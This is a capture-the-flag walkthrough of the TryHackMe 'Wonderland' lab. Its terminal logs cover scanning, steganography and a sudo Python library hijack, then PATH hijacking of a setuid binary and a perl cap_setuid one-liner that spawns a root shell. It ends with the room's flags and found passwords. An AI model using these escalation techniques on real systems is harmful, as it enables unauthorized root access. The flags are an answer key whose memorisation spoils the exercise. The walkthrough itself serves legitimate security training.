# Wonderland

Fall down the rabbit hole and enter wonderland.

[Wonderland](https://tryhackme.com/room/wonderland)

## Topic's

- Network Enumeration
- Web ENumeration
- Steganography
- Web Poking
- Misconfigured Binaries
- Reverse Engineering

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Capture the flags

Enter Wonderland and capture the flags.

```
kali@kali:~/CTFs/tryhackme/Wonderland$ sudo nmap -A -sS -sC -sV -O 10.10.118.56
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 10:42 CEST
Nmap scan report for 10.10.118.56
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/11%OT=22%CT=1%CU=39233%PV=Y%DS=2%DC=T%G=Y%TM=5F82C5
OS:AD%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST
OS:11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   36.40 ms 10.8.0.1
2   36.69 ms 10.10.118.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.47 seconds
```

```
kali@kali:~/CTFs/tryhackme/Wonderland$ gobuster dir -u 10.10.118.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.118.56
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/11 10:44:47 Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
Progress: 14638 / 220561 (6.64%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/11 10:45:51 Finished
===============================================================
```

[http://10.10.118.56/img/](http://10.10.118.56/img/)

```
kali@kali:~/CTFs/tryhackme/Wonderland$ exiftool alice_door.jpg
ExifTool Version Number         : 12.06
File Name                       : alice_door.jpg
Directory                       : .
File Size                       : 1520 kB
File Modification Date/Time     : 2020:05:25 18:34:52+02:00
File Access Date/Time           : 2020:10:11 10:46:46+02:00
File Inode Change Date/Time     : 2020:10:11 10:46:46+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 600
Y Resolution                    : 600
Resolution Unit                 : inches
Software                        : Adobe Photoshop CS3 Macintosh
Modify Date                     : 2008:01:20 01:49:10
Color Space                     : Uncalibrated
Exif Image Width                : 1962
Exif Image Height               : 1942
Compression                     : JPEG (old-style)
Thumbnail Offset                : 332
Thumbnail Length                : 12311
Current IPTC Digest             : 460cf28926b856dab09c01a1b0a79077
Application Record Version      : 2
IPTC Digest                     : 460cf28926b856dab09c01a1b0a79077
Displayed Units X               : inches
Displayed Units Y               : inches
Print Style                     : Centered
Print Position                  : 0 0
Print Scale                     : 1
Global Angle                    : 30
Global Altitude                 : 30
Copyright Flag                  : False
URL List                        :
Slices Group Name               : De_Alice's_Abenteuer_im_Wunderland_Carroll_pic_03
Num Slices                      : 1
Pixel Aspect Ratio              : 1
Photoshop Thumbnail             : (Binary data 12311 bytes, use -b option to extract)
Has Real Merged Data            : Yes
Writer Name                     : Adobe Photoshop
Reader Name                     : Adobe Photoshop CS3
Photoshop Quality               : 12
Photoshop Format                : Progressive
Progressive Scans               : 3 Scans
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Create Date                     : 2008:01:20 01:47:53-05:00
Metadata Date                   : 2008:01:20 01:49:10-05:00
Creator Tool                    : Adobe Photoshop CS3 Macintosh
Format                          : image/jpeg
Color Mode                      : RGB
History                         :
Instance ID                     : uuid:436B87178CC8DC11A35E97C268772518
Native Digest                   : 256,257,258,259,262,274,277,284,530,531,282,283,296,301,318,319,529,532,306,270,271,272,305,315,33432;75A2F56A7448AE47A140395308BA4302
DCT Encode Version              : 100
APP14 Flags 0                   : [14]
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1962
Image Height                    : 1942
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1962x1942
Megapixels                      : 3.8
Thumbnail Image                 : (Binary data 12311 bytes, use -b option to extract)
```

```
kali@kali:~/CTFs/tryhackme/Wonderland$ exiftool alice_door.png
ExifTool Version Number         : 12.06
File Name                       : alice_door.png
Directory                       : .
File Size                       : 1800 kB
File Modification Date/Time     : 2020:06:02 00:23:17+02:00
File Access Date/Time           : 2020:10:11 10:47:01+02:00
File Inode Change Date/Time     : 2020:10:11 10:47:01+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1962
Image Height                    : 1942
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 23622
Pixels Per Unit Y               : 23622
Pixel Units                     : meters
Image Size                      : 1962x1942
Megapixels                      : 3.8
```

```
kali@kali:~/CTFs/tryhackme/Wonderland$ exiftool white_rabbit_1.jpg
ExifTool Version Number         : 12.06
File Name                       : white_rabbit_1.jpg
Directory                       : .
File Size                       : 1947 kB
File Modification Date/Time     : 2020:05:25 18:25:28+02:00
File Access Date/Time           : 2020:10:11 10:47:08+02:00
File Inode Change Date/Time     : 2020:10:11 10:47:08+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 594
Y Resolution                    : 594
Image Width                     : 1102
Image Height                    : 1565
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)
Image Size                      : 1102x1565
Megapixels                      : 1.7
```

```
kali@kali:~/CTFs/tryhackme/Wonderland$ steghide extract -sf white_rabbit_1.jpg
Enter passphrase:
wrote extracted data to "hint.txt".
kali@kali:~/CTFs/tryhackme/Wonderland$ cat hint.txt
follow the r a b b i t
```

[view-source:http://10.10.118.56/r/](view-source:http://10.10.118.56/r/)

```html
<!DOCTYPE html>
<head>
  <title>Follow the white rabbit.</title>
  <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
  <h1>Keep Going.</h1>
  <p>"Would you tell me, please, which way I ought to go from here?"</p>
</body>
```

[view-source:http://10.10.118.56/r/a/](view-source:http://10.10.118.56/r/a/)

```html
<!DOCTYPE html>
<head>
  <title>Follow the white rabbit.</title>
  <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
  <h1>Keep Going.</h1>
  <p>"That depends a good deal on where you want to get to," said the Cat.</p>
</body>
```

[view-source:http://10.10.118.56/r/a/b/](view-source:http://10.10.118.56/r/a/b/)

```html
<!DOCTYPE html>
<head>
  <title>Follow the white rabbit.</title>
  <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
  <h1>Keep Going.</h1>
  <p>"I don’t much care where—" said Alice.</p>
</body>
```

[view-source:http://10.10.118.56/r/a/b/b/](view-source:http://10.10.118.56/r/a/b/b/)

```html
<!DOCTYPE html>
<head>
  <title>Follow the white rabbit.</title>
  <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
  <h1>Keep Going.</h1>
  <p>"Then it doesn’t matter which way you go," said the Cat.</p>
</body>
```

[view-source:http://10.10.118.56/r/a/b/b/i/](view-source:http://10.10.118.56/r/a/b/b/i/)

```html
<!DOCTYPE html>
<head>
  <title>Follow the white rabbit.</title>
  <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
  <h1>Keep Going.</h1>
  <p>"—so long as I get somewhere,"" Alice added as an explanation.</p>
</body>
```

[view-source:http://10.10.118.56/r/a/b/b/i/t/](view-source:http://10.10.118.56/r/a/b/b/i/t/)

```
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```

`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

```
kali@kali:~/CTFs/tryhackme/Wonderland$ ssh alice@10.10.118.56
The authenticity of host '10.10.118.56 (10.10.118.56)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.118.56' (ECDSA) to the list of known hosts.
alice@10.10.118.56's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 11 08:54:30 UTC 2020

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 28%                IP address for eth0: 10.10.118.56
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
drwx------ 2 alice alice 4096 May 25 16:37 .cache
drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
alice@wonderland:~$ ls -la /root
ls: cannot open directory '/root': Permission denied
alice@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
alice@wonderland:~$
```

```
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

alice@wonderland:~$ /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
The line was:    And this was odd, because, you know,
The line was:    Are very good indeed —
The line was:    "The night is fine," the Walrus said
The line was:    And made them trot so quick!"
The line was:    And you are very nice!"
The line was:    And shed a bitter tear.
The line was:    Their shoes were clean and neat —
The line was:    Were walking close at hand;
The line was:    Four other Oysters followed them,
The line was:    He did his very best to make
```

```
alice@wonderland:~$ cd /home/alice/
alice@wonderland:~$ cat > random.py << EOF
> import os
> os.system("/bin/bash")
> EOF
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit
rabbit@wonderland:~$ cd ~
rabbit@wonderland:~$ pwd
/home/alice
rabbit@wonderland:~$ cd /home/rabbit/
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25 17:58 .
drwxr-xr-x 6 root   root    4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sun, 11 Oct 2020 09:59:45 +0000
Ask very nicely, and I will give you some tea while you wait for him
tea
Segmentation fault (core dumped)
rabbit@wonderland:/home/rabbit$
```

```
python3 -m http.server
```

```
kali@kali:~/CTFs/tryhackme/Wonderland$ strings teaParty
```

```c
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
```

```
rabbit@wonderland:/home/rabbit$ mkdir attack
rabbit@wonderland:/home/rabbit$ nano date
Unable to create directory /home/alice/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

rabbit@wonderland:/home/rabbit$ ls
attack  date  teaParty
rabbit@wonderland:/home/rabbit$ cp date ./attack/
rabbit@wonderland:/home/rabbit$ rm date
rabbit@wonderland:/home/rabbit$ chmod +x attack/date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit/attack/:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ whoami
hatter
hatter@wonderland:/home/rabbit$
```

```
hatter@wonderland:/home/rabbit$ cd /home/hatter/
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25 22:56 .
drwxr-xr-x 6 root   root   4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root      9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25 02:58 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25 02:58 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25 03:42 .local
-rw-r--r-- 1 hatter hatter  807 May 25 02:58 .profile
-rw------- 1 hatter hatter   29 May 25 22:56 password.txt
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
hatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
hatter@wonderland:/home/hatter$ su hatter
Password:
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
root@wonderland:~#
```

[https://gtfobins.github.io/gtfobins/perl/#sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)

1. Obtain the flag in user.txt

`thm{"Curiouser and curiouser!"}`

2. Escalate your privileges, what is the flag in root.txt?

`thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
